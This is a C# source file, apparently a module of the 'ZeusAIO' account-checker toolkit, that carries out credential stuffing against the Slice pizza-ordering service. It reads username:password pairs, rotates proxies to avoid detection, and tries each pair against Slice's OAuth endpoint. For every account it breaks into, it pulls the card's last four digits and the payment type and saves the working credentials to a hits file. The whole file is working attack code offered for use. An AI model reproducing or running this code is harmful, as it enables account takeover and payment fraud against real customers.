using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;

namespace SliceLife
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.AllowAutoRedirect = false;
                        httpRequest.IgnoreProtocolErrors = true;
                        httpRequest.UserAgent = "okhttp/3.13.1";
                        string str = "password=" + s[1] + "&grant_type=password&username=" + s[0];
                        httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                        new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                        string text2 = httpRequest.Post("https://coreapi.slicelife.com/oauth/token", str, "application/x-www-form-urlencoded").ToString();
                        bool flag9 = text2.Contains("\"Unauthorized\"");
                        if (flag9)
                        {
                            //Bad
                            break;
                        }
                        else if (text2.Contains("\"access_token\""))
                        {
                                string access_token = Check.Parse(text2, "access_token\":\"", "\",\"");
                                httpRequest.AddHeader("Authorization", "Bearer " + access_token);
                                string text3 = httpRequest.Get("https://coreapi.slicelife.com/api/v1/payment_methods?include_paypal=1", null).ToString();
                                string text4 = Check.Parse(text3, ",\"last_four\":\"", "\",\"");
                                string text5 = Check.Parse(text3, ",\"payment_type\":\"", "\",\"");
                                ZeusAIO.mainmenu.hits++;
                                if (Config.config.LogorCui == "2")
                                {
                                    Console.WriteLine("[HIT - SLICELIFE] " + s[0] + ":" + s[1] + " | Last4Digits: " + text4 + " | PaymentType: " + text5, Color.Green);
                                }
                                Export.AsResult("/Slicelife_hits", s[0] + ":" + s[1] + " | Last4Digits: " + text4 + " | PaymentType: " + text5);
                                return false;
                            }
                        else
                            {
                                ZeusAIO.mainmenu.errors++;
                                goto Retry;
                            }
                    }
                    //break;
                }
                catch (Exception ex)
                {
                    ZeusAIO.mainmenu.errors++;
                }
            return false;
        }
        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }
    }
}

